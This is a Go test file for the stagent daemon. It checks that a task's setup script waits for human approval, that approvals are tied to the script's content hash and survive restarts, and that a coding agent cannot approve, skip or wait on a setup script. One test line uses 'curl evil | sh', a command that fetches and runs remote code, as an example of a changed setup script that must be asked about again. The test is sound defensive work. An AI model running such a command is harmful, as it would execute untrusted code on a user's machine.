package daemon

import (
	"context"
	"encoding/json"
	"os"
	"runtime"
	"testing"
	"time"

	"github.com/obutora/stagent/internal/rpc"
	"github.com/obutora/stagent/internal/task"
	"github.com/obutora/stagent/internal/wire"
)

// awaitSetup calls task.await_setup in the background; the answer (or
// error) arrives on the returned channel.
func awaitSetup(c *rpc.Client, id, script string) chan any {
	ch := make(chan any, 1)
	go func() {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		var r wire.TaskAwaitSetupResult
		if err := c.Call(ctx, wire.MethodTaskAwaitSetup, wire.TaskAwaitSetupParams{ID: id, Script: script}, &r); err != nil {
			ch <- err
			return
		}
		ch <- r
	}()
	return ch
}

func setupAnswer(t *testing.T, ch chan any) wire.TaskAwaitSetupResult {
	t.Helper()
	select {
	case v := <-ch:
		r, ok := v.(wire.TaskAwaitSetupResult)
		if !ok {
			t.Fatalf("task.await_setup: %v", v)
		}
		return r
	case <-time.After(5 * time.Second):
		t.Fatal("task.await_setup not answered")
	}
	return wire.TaskAwaitSetupResult{}
}

func setupPending(id string) func(*wire.Msg) bool {
	return func(m *wire.Msg) bool {
		var tk wire.Task
		return taskUpdated(id, wire.TaskPreparing)(m) && json.Unmarshal(m.Params, &tk) == nil && tk.SetupPending != nil
	}
}

// A preparing task waiting on a scripts.setup shows it to the app
// (setup_pending, stage setup) until task.setup decides. Running it
// answers run and approves the content for the source checkout in
// setup-approvals.json (0600), so the next task of that checkout with the
// same content is answered at once; another content is asked again, and
// skipping it answers skip without approving it.
func TestTaskSetupApproval(t *testing.T) {
	e := startDaemon(t, fastConfig(), Options{PrepareGrace: time.Minute})
	watcher, events := e.client()
	call(t, watcher, wire.MethodWatch, wire.WatchParams{}, nil)
	app, _ := e.client()
	run, _ := e.client()
	repo := abs("/w/repo")
	tk := registerTask(t, run, issueTask(repo, 7, "00000000000000a1")).Task
	const script = "make deps\n"
	answer := awaitSetup(run, tk.ID, script)
	got := decodeTask(t, await(t, events, "setup pending", setupPending(tk.ID)))
	if got.Stage != wire.TaskStageSetup || got.SetupPending.Script != script || got.SetupPending.Hash != task.SetupHash(script) {
		t.Fatalf("pending task %+v (%+v)", got, got.SetupPending)
	}
	if ts := listTasks(t, app); ts[0].SetupPending == nil || ts[0].SetupPending.Hash != task.SetupHash(script) {
		t.Fatalf("task.list %+v", ts[0])
	}
	if err := callErr(app, wire.MethodTaskSetup, wire.TaskSetupParams{ID: tk.ID, Hash: task.SetupHash("other"), Run: true}, nil); errCode(err) != wire.ErrBadRequest {
		t.Fatalf("task.setup naming another content: %v", err)
	}
	if err := callErr(app, wire.MethodTaskSetup, wire.TaskSetupParams{ID: "nope", Hash: got.SetupPending.Hash}, nil); errCode(err) != wire.ErrNotFound {
		t.Fatalf("task.setup of an unknown task: %v", err)
	}
	call(t, app, wire.MethodTaskSetup, wire.TaskSetupParams{ID: tk.ID, Hash: got.SetupPending.Hash, Run: true}, nil)
	if r := setupAnswer(t, answer); !r.Run {
		t.Fatal("approved setup answered skip")
	}
	await(t, events, "pending cleared", func(m *wire.Msg) bool {
		return taskUpdated(tk.ID, wire.TaskPreparing)(m) && decodeTask(t, m).SetupPending == nil
	})
	if !task.SetupApproved(e.layout.SetupApprovals, repo, task.SetupHash(script)) {
		t.Fatal("the approval is not kept")
	}
	if runtime.GOOS != "windows" {
		if st, err := os.Stat(e.layout.SetupApprovals); err != nil || st.Mode().Perm() != 0o600 {
			t.Fatalf("setup-approvals.json: %v %v", st, err)
		}
	}

	next := registerTask(t, run, issueTask(repo, 8, "00000000000000a2")).Task
	if r := setupAnswer(t, awaitSetup(run, next.ID, script)); !r.Run {
		t.Fatal("an approved content was asked again")
	}
	if ts := listTasks(t, app); ts[1].SetupPending != nil {
		t.Fatalf("approved content left pending: %+v", ts[1])
	}

	const changed = "make deps && curl evil | sh\n"
	answer = awaitSetup(run, next.ID, changed)
	got = decodeTask(t, await(t, events, "changed setup pending", setupPending(next.ID)))
	if got.SetupPending.Script != changed {
		t.Fatalf("pending %+v", got.SetupPending)
	}
	call(t, app, wire.MethodTaskSetup, wire.TaskSetupParams{ID: next.ID, Hash: got.SetupPending.Hash}, nil)
	if r := setupAnswer(t, answer); r.Run {
		t.Fatal("skipped setup answered run")
	}
	if task.SetupApproved(e.layout.SetupApprovals, repo, task.SetupHash(changed)) {
		t.Fatal("a skipped content was approved")
	}
	if err := callErr(app, wire.MethodTaskSetup, wire.TaskSetupParams{ID: next.ID, Hash: got.SetupPending.Hash}, nil); errCode(err) != wire.ErrBadRequest {
		t.Fatalf("task.setup with nothing pending: %v", err)
	}
}

// The approvals survive a restart.
func TestTaskSetupApprovalPersists(t *testing.T) {
	e := startDaemon(t, fastConfig(), Options{PrepareGrace: time.Minute})
	c, _ := e.client()
	tk := registerTask(t, c, issueTask(abs("/w/repo"), 7, "00000000000000a1")).Task
	answer := awaitSetup(c, tk.ID, "make\n")
	app, _ := e.client()
	for deadline := time.Now().Add(5 * time.Second); listTasks(t, app)[0].SetupPending == nil; {
		if time.Now().After(deadline) {
			t.Fatal("not pending")
		}
		time.Sleep(10 * time.Millisecond)
	}
	call(t, app, wire.MethodTaskSetup, wire.TaskSetupParams{ID: tk.ID, Hash: task.SetupHash("make\n"), Run: true}, nil)
	setupAnswer(t, answer)
	e.stop()

	e2 := startDaemonAt(t, fastConfig(), Options{PrepareGrace: time.Minute})
	c2, _ := e2.client()
	next := registerTask(t, c2, issueTask(abs("/w/repo"), 8, "00000000000000a2")).Task
	if r := setupAnswer(t, awaitSetup(c2, next.ID, "make\n")); !r.Run {
		t.Fatal("the approval did not survive a restart")
	}
}

// A decision made while `stagent task run` is away (its connection lost)
// answers it when it waits again; an interrupted preparation drops what
// was pending.
func TestTaskSetupDecidedWhileAway(t *testing.T) {
	e := startDaemon(t, fastConfig(), Options{PrepareGrace: 300 * time.Millisecond})
	watcher, events := e.client()
	call(t, watcher, wire.MethodWatch, wire.WatchParams{}, nil)
	app, _ := e.client()
	const prep = "00000000000000a1"
	run, _ := e.client()
	tk := registerTask(t, run, issueTask(abs("/w/repo"), 7, prep)).Task
	s := testSession(prep)
	s.Cwd = abs("/w/repo-7")
	e.register(s)
	awaitSetup(run, tk.ID, "make\n")
	got := decodeTask(t, await(t, events, "setup pending", setupPending(tk.ID)))
	run.Close()
	call(t, app, wire.MethodTaskSetup, wire.TaskSetupParams{ID: tk.ID, Hash: got.SetupPending.Hash}, nil)
	again, _ := e.client()
	if r := setupAnswer(t, awaitSetup(again, tk.ID, "make\n")); r.Run {
		t.Fatal("skipped while away answered run")
	}

	never := registerTask(t, app, issueTask(abs("/w/repo"), 9, "00000000000000a9")).Task
	awaitSetup(app, never.ID, "make\n")
	await(t, events, "setup pending", setupPending(never.ID))
	got = decodeTask(t, await(t, events, "interrupted", taskUpdated(never.ID, wire.TaskFailed)))
	if got.SetupPending != nil {
		t.Fatalf("interrupted task keeps its pending setup: %+v", got)
	}
}

// A coding agent's process tree can neither run (approve) nor skip a
// scripts.setup, nor wait on one (ADR 0004).
func TestTaskSetupRefusedToAgents(t *testing.T) {
	e := startDaemon(t, fastConfig(), Options{Guard: guardAs("claude")})
	c, _ := e.client()
	for _, m := range []struct {
		method string
		params any
	}{
		{wire.MethodTaskSetup, wire.TaskSetupParams{ID: "x", Hash: task.SetupHash("make\n"), Run: true}},
		{wire.MethodTaskAwaitSetup, wire.TaskAwaitSetupParams{ID: "x", Script: "make\n"}},
	} {
		if err := callErr(c, m.method, m.params, nil); errCode(err) != wire.ErrAgentRefused {
			t.Errorf("%s from an agent: %v, want %s", m.method, err, wire.ErrAgentRefused)
		}
	}
	if _, err := os.Stat(e.layout.SetupApprovals); !os.IsNotExist(err) {
		t.Fatalf("setup-approvals.json written: %v", err)
	}
}
